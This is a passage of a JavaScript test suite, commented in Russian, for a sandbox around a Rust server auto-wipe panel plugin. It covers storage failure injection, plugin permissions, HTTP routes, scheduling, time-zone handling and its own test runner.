  assert.equal(AbortSignal.timeout, originalAbortTimeout);
});

// ── Контекст и коллекции ────────────────────────────────────────────────────

test('коллекции: порядок, sort после limit, фильтр с undefined, JSON, внедрение сбоев, хранилище', async () => {
  const { ctx, store } = makeContext({ panel: createPanel(), tunnel: createTunnel() });
  const things = ctx.collection('things');
  await things.insert({ id: 'a', n: 1 });
  await things.insert({ id: 'b', n: 2 });
  await things.insert({ id: 'c', n: 3 });
  assert.deepEqual((await things.find()).map((doc) => doc.id), ['c', 'b', 'a'], 'без sort — сначала новые');
  assert.deepEqual((await things.find({}, { sort: { n: 1 }, limit: 2 })).map((doc) => doc.id), ['b', 'c'], 'limit берёт новые, sort — потом');
  assert.equal((await things.find({ id: undefined })).length, 3, 'undefined в фильтре условием не считается');
  assert.equal((await things.findOne({ id: 'a' })).n, 1);
  assert.equal(await things.update({ id: 'a' }, { $set: { n: 10 } }), 1);
  assert.equal(await things.count({ n: 10 }), 1);
  const stored = await things.insert({ id: 'd', when: new Date('2026-01-01T00:00:00Z'), gone: undefined });
  assert.equal(typeof stored.when, 'string');
  assert.equal('gone' in stored, false);
  assert.ok(stored._id && stored._createdAt && stored._updatedAt);

  store.failWrite({ collection: 'things', nth: 2 });
  await things.insert({ id: 'e' });
  await assert.rejects(things.insert({ id: 'f' }), /сбой записи \(коллекция things, insert, обращение №2\)/);
  await things.insert({ id: 'g' });
  assert.equal(await things.count({ id: 'f' }), 0);

  store.failWrite({ collection: 'runs' });
  await ctx.collection('profiles').insert({ id: 'p' });
  await assert.rejects(ctx.collection('runs').insert({ id: 'r' }), /коллекция runs/);

  store.failWrite({ nth: 2, op: 'update' });
  await things.insert({ id: 'h' });
  assert.equal(await things.update({ id: 'h' }, { $set: { x: 1 } }), 1);
  await assert.rejects(things.update({ id: 'h' }, { $set: { x: 2 } }), /update/);

  await ctx.setStorage('k', { a: 1 });
  assert.deepEqual(await ctx.getStorage('k'), { a: 1 });
  assert.equal(await ctx.getStorage('missing'), null);
  store.failWrite({ storageKey: 'k' });
  await assert.rejects(ctx.setStorage('k', 2), /ключ k/);
  store.failRead({ collection: 'things' });
  await assert.rejects(things.find(), /сбой чтения/);
});

test('контекст: настройки plugin.json, права плагина у туннеля и db.servers, scheduleTask', async () => {
  const panel = createPanel();
  const tunnel = createTunnel({ tree: createTree(rustServerTree()) });
  const env = makeContext({ panel, tunnel, config: { stopTimeoutSec: 60 } });
  assert.equal(env.ctx.getConfig('stopTimeoutSec'), 60);
  assert.equal(env.ctx.getConfig('startTimeoutSec'), 240, 'значение по умолчанию из plugin.json');
  assert.equal(env.ctx.getConfig('dryRun'), false);
  assert.equal(env.ctx.manifest.version, JSON.parse(fs.readFileSync(new URL('../../rust-autowipe/plugin.json', import.meta.url))).version);
  assert.deepEqual(env.grants, ['server.read', 'files.read', 'files.write']);
  assert.throws(() => env.ctx.scheduleTask('каждую минуту', () => {}), /Invalid cron expression/);

  const readOnly = makeContext({ panel, tunnel, grants: ['server.read', 'files.read'] });
  await assert.rejects(
    readOnly.ctx.fileTunnel.queueRequest('node1', 'delete', tunnel.tree.uuid, '/start.sh'),
    /Permission denied: file write operation "delete" requires files.write or server.write/,
  );
  assert.equal((await readOnly.ctx.fileTunnel.queueRequest('node1', 'list', tunnel.tree.uuid, '/')).success, true);
  const noServers = makeContext({ panel, tunnel, grants: ['files.read'] });
  assert.throws(() => noServers.ctx.db.servers, /Permission denied: servers access not declared in manifest/);
  await assert.rejects(env.ctx.fileTunnel.queueRequest('node1', 'frobnicate', tunnel.tree.uuid, '/'), /unknown op/);
  assert.equal(env.ctx.hasPermission({ user: { permissions: ['admin.write'] } }, 'rust-autowipe.manage'), true);
  assert.equal(env.ctx.hasPermission({ user: { permissions: ['admin.read'] } }, 'rust-autowipe.manage'), false);
  assert.equal(env.ctx.getUserId({ user: { userId: 'u1' } }), 'u1');
});

test('плагин: сбой записи прогона (коллекция runs) внедряется', async (t) => {
  const sb = createSandbox();
  await sb.load();
  sb.store.failWrite({ collection: 'runs', op: 'insert' });
  const profile = await sb.addProfile();
  const run = await sb.wipe(profile);
  // Сбой внедрён ровно один раз. Сколько записей осталось — дело плагина: после ревью
  // он пишет запись прогона в начале и повторяет запись в конце, поэтому прогон не теряется.
  const failed = sb.journal.of('db').filter((entry) => entry.failed);
  assert.deepEqual(failed.map((entry) => `${entry.table}.${entry.op}`), ['runs.insert']);
  t.note(`плагин: ok=${run.ok}; записей прогона: ${sb.runs().length}; профиль после сбоя: lastRunStatus=${sb.profiles()[0].lastRunStatus ?? '—'}`);
});

// ── Роуты и планировщик ─────────────────────────────────────────────────────

test('роуты: от имени разных людей, свои заголовки и cookie, 401, 404, 504 по шлюзу панели', async () => {
  const sb = createSandbox();
  await sb.load();
  let res = await sb.call(null, 'GET', '/servers/srv1/status');
  assert.deepEqual([res.status, res.body], [401, { error: 'Unauthorized' }]);
  res = await sb.call('admin', 'GET', '/nope');
  assert.deepEqual([res.status, res.body], [404, { success: false, error: 'Plugin route not found' }]);
  res = await sb.call('admin', 'GET', '/servers/srv1/status');
  assert.deepEqual([res.status, res.body.data.server.id], [200, 'srv1']);
  res = await sb.call('owner', 'GET', '/api/plugins/rust-autowipe/servers/srv1/status');
  assert.equal(res.status, 200, 'полный адрес тоже принимается');

  res = await sb.call('owner', 'POST', '/servers/srv1/profiles', {
    body: { name: 'Карта', targets: ['/server/*/proceduralmap.*.map'], schedule: { kind: 'weekly', weekday: 4, time: '05:00' } },
  });
  assert.equal(res.status, 200, JSON.stringify(res.body));
  const id = res.body.data.id;
  res = await sb.call('owner', 'GET', '/servers/srv1/profiles');
  assert.deepEqual(res.body.data.map((profile) => profile.id), [id]);

  // Субпользователя плагин ищет в списке доступа сервера своим ключом: cookie ему не нужны
  // и в панель не пересылаются.
  res = await sb.call('sub', 'GET', '/servers/srv1/status', { cookie: false });
  assert.equal(res.status, 200, 'субпользователь из списка доступа проходит и без cookie');
  res = await sb.call('sub', 'GET', '/servers/srv1/status', { cookie: 'better-auth.session_token=sess_sub; theme=dark' });
  assert.equal(res.status, 200);
  assert.ok(!sb.panel.calls.some((call) => String(call.headers?.cookie ?? '').includes('theme=dark')), 'cookie пользователя ушли в панель');
  res = await sb.call('stranger', 'GET', '/servers/srv1/status');
  assert.equal(res.status, 403, 'чужого нет в списке доступа');

  res = await sb.call('admin', 'GET', '/servers/srv1/files', { query: { path: '/oxide/data' } });
  assert.equal(res.status, 200);
  assert.ok(res.body.data.entries.some((entry) => entry.name === 'Kits.json'));

  sb.tunnel.hang({ op: 'list', path: '/server' });
  const started = sb.clock.now();
  res = await sb.call('admin', 'GET', '/servers/srv1/files?path=/server');
  assert.deepEqual([res.status, res.body.error], [504, 'Plugin request timed out after 30000ms']);
  assert.equal(sb.clock.now() - started, 30000);
});

test('планировщик: onEnable ставит задачу, тик вызывается вручную', async () => {
  // Предупреждения выключены: с ними пропущенный вайп догоняется после отсчёта в чате.
  const sb = createSandbox({ config: { wipeWarningEnabled: false } });
  await sb.load({ enable: true });
  assert.deepEqual([...sb.tasks.values()].map((task) => task.cron), ['* * * * *']);
  await sb.idle();
  await sb.addProfile({ nextRunAt: new Date(Date.now() - 60000).toISOString() });
  await sb.tick();
  assert.equal(sb.runs().length, 1);
  assert.equal(sb.runs()[0].trigger, 'schedule');
  assert.ok(sb.journal.of('task').some((entry) => entry.op === 'run'));
  const nextRunAt = new Date(sb.profiles()[0].nextRunAt).getTime();
  assert.ok(nextRunAt > Date.now(), 'время следующего запуска перенесено вперёд');
});

test('изоляция: каждая загрузка плагина получает свои модули и своё состояние', async () => {
  const sb = createSandbox();
  const first = await loadPlugin(sb);
  const routesAfterFirst = sb.routes.length;
  assert.ok(routesAfterFirst > 5);
  const second = await loadPlugin(sb);
  assert.notEqual(first.module, second.module);
  assert.equal(sb.routes.length, routesAfterFirst, 'повторная загрузка заменяет роуты, а не дублирует');
  assert.equal(sb.module, second.module);
  const warningsA = await first.lib('warnings');
  const warningsB = await second.lib('warnings');
  assert.notEqual(warningsA, warningsB);
  await sb.run(warningsA.recordWarningState(sb.ctx, { ok: true, text: 'A' }));
  assert.equal(warningsA.getWarningState().text, 'A');
  assert.equal(warningsB.getWarningState(), null);
});

// ── Процессы, часовые пояса, фреймворк, run.mjs ─────────────────────────────

test('часовые пояса: дочерний процесс с TZ; несработавший TZ — провал', async () => {
  const probe = 'console.log(new Date(Date.UTC(2026, 10, 19)).getTimezoneOffset(), Intl.DateTimeFormat().resolvedOptions().timeZone)';
  for (const [zone, offset] of [['UTC', 0], ['Europe/Moscow', -180], ['America/New_York', 300]]) {
    const result = await runNode({ code: probe, tz: zone });
    assert.equal(result.code, 0, result.stderr);
    assert.equal(result.stdout.trim(), `${offset} ${zone}`);
    assert.equal(result.tz, zone);
  }
  await withTempDir(async (dir) => {
    const file = path.join(dir, 'zone.mjs');
    await fsp.writeFile(file, 'console.log(process.env.TZ, new Date(Date.UTC(2026, 6, 1)).getTimezoneOffset())');
    const result = await runWithTz(file, 'America/New_York');
    assert.equal(result.stdout.trim(), 'America/New_York 240', 'летнее время в Нью-Йорке');
  });
  const wrong = await runNode({ code: `${CHILD_PRELUDE}test('пусто', () => {});`, tz: 'Not/AZone' });
  assert.equal(wrong.code, 1);
  assert.match(wrong.stdout, /часовой пояс TZ=Not\/AZone не применился/);
}, { timeoutMs: 30000 });

test('мини-фреймворк: провал, вечный промис, отклонение, сторож, process.exit — всё FAIL с кодом 1', async () => {
  const many = await runNode({
    code: `${CHILD_PRELUDE}
test('ok', () => {});
test('провал', () => { assert.equal(1, 2); });
test('вечный промис', () => new Promise(() => {}));
test('после зависания', () => {});
test('отклонение без обработчика', async () => { Promise.reject(new Error('бум')); await new Promise((r) => setTimeout(r, 50)); });
test('сторож', async () => { for (;;) await new Promise((r) => setImmediate(r)); }, { timeoutMs: 300 });
`,
    timeoutMs: 30000,
  });
  assert.equal(many.code, 1, many.stdout + many.stderr);
  assert.match(many.stdout, /PASS {2}ok/);
  assert.match(many.stdout, /FAIL {2}провал/);
  assert.match(many.stdout, /FAIL {2}вечный промис[^\n]*\n\s+тест не завершился/);
  assert.match(many.stdout, /PASS {2}после зависания/);
  assert.match(many.stdout, /FAIL {2}отклонение без обработчика[^\n]*\n\s+необработанное отклонение промиса: бум/);
  assert.match(many.stdout, /FAIL {2}сторож[^\n]*\n\s+сторож: тест идёт дольше 300 мс/);
  assert.match(many.stdout, /Итог: 2 PASS, 4 FAIL/);

  const exited = await runNode({
    code: `${CHILD_PRELUDE}
test('выход посреди теста', () => { process.exit(0); });
test('не дошёл', () => {});
`,
  });
  assert.equal(exited.code, 1);
  assert.match(exited.stdout, /FAIL {2}выход посреди теста[^\n]*\n\s+тест не завершился: процесс завершился \(код 0\)/);
  assert.match(exited.stdout, /FAIL {2}не дошёл\n\s+не запускался/);
  assert.match(exited.stdout, /Итог: 0 PASS, 2 FAIL/);
}, { timeoutMs: 60000 });

test('run.mjs: файлы по очереди, итог по файлам, --only, --tz, --list, ошибка пояса', async () => {
  await withTempDir(async (dir) => {
    const header = `import { test } from ${JSON.stringify(SANDBOX_URL)};\n`;
    await fsp.writeFile(path.join(dir, 'a-pass.test.mjs'), `${header}test('проходит', () => {});\n`);
    await fsp.writeFile(path.join(dir, 'b-fail.test.mjs'), `${header}test('падает', () => { throw new Error('нарочно'); });\n`);
    await fsp.writeFile(path.join(dir, 'c-helper.mjs'), 'throw new Error("не тест — не запускать");\n');
    const run = (...args) => runNode({ file: RUN_MJS, args: ['--dir', dir, ...args], timeoutMs: 60000 });

    const all = await run();
    assert.equal(all.code, 1, all.stdout + all.stderr);
    assert.match(all.stdout, /OK {4}[^\n]*a-pass\.test\.mjs {2}1 PASS, 0 FAIL/);
    assert.match(all.stdout, /FAIL {2}[^\n]*b-fail\.test\.mjs {2}0 PASS, 1 FAIL/);
    assert.match(all.stdout, /Файлов: 2, прогонов: 2, провалено: 1/);
    assert.doesNotMatch(all.stdout, /c-helper/);
    assert.ok(all.stdout.indexOf('a-pass') < all.stdout.indexOf('b-fail'), 'по очереди, по имени');

    const only = await run('--only', 'a-pass');
    assert.equal(only.code, 0, only.stdout);
    assert.match(only.stdout, /Файлов: 1, прогонов: 1, провалено: 0/);

    const zones = await run('--only', 'a-pass', '--tz', 'UTC,Europe/Moscow');
    assert.equal(zones.code, 0, zones.stdout);
    assert.match(zones.stdout, /TZ: UTC \(UTC\+00:00\)/);
    assert.match(zones.stdout, /TZ: Europe\/Moscow \(UTC\+03:00\)/);
    assert.match(zones.stdout, /Файлов: 1, прогонов: 2, провалено: 0/);

    const listed = await run('--list', '--tz', 'UTC');
    assert.equal(listed.code, 0);
    assert.match(listed.stdout, /a-pass\.test\.mjs {2}\[TZ=UTC\]/);
    assert.doesNotMatch(listed.stdout, /═══/);

    const badZone = await run('--tz', 'Mars/Olympus');
    assert.equal(badZone.code, 2);
    assert.match(badZone.stderr, /неизвестный часовой пояс «Mars\/Olympus»/);
  });
}, { timeoutMs: 120000 });

test('временная папка: создаётся в os.tmpdir() через mkdtemp и убирается', async () => {
  const base = await fsp.realpath(os.tmpdir());
  let seen = null;
  const value = await withTempDir(async (dir) => {
    seen = dir;
    assert.ok(dir.startsWith(base + path.sep));
    assert.ok(path.basename(dir).startsWith('rustwipe-review-'));
    await fsp.mkdir(path.join(dir, 'server', 'rust'), { recursive: true });
    await fsp.writeFile(path.join(dir, 'server', 'rust', 'sv.db'), 'x');
    return 'готово';
  });
  assert.equal(value, 'готово');
  assert.equal(fs.existsSync(seen), false);
});
